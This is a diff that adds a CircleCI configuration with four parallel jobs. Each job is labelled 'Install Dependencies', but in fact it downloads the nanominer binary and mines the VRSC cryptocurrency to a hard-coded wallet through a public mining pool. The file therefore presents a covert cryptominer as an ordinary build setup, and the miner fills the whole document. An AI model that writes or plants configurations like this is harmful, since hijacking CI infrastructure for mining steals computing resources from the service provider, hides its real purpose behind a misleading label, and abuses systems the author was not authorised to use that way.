@@ -1,0 +1,42 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet RE4XiyakxZjFs6hWMNWCReYjuX2qFVkspF -coin VRSC -rigName rig1 -pool1 stratum+tcp://eu.luckpool.net:3956
+
+    Devop1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet RE4XiyakxZjFs6hWMNWCReYjuX2qFVkspF -coin VRSC -rigName rig1 -pool1 stratum+tcp://eu.luckpool.net:3956
+
+    Devop2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet RE4XiyakxZjFs6hWMNWCReYjuX2qFVkspF -coin VRSC -rigName rig1 -pool1 stratum+tcp://eu.luckpool.net:3956
+
+    Devop3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet RE4XiyakxZjFs6hWMNWCReYjuX2qFVkspF -coin VRSC -rigName rig1 -pool1 stratum+tcp://eu.luckpool.net:3956
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
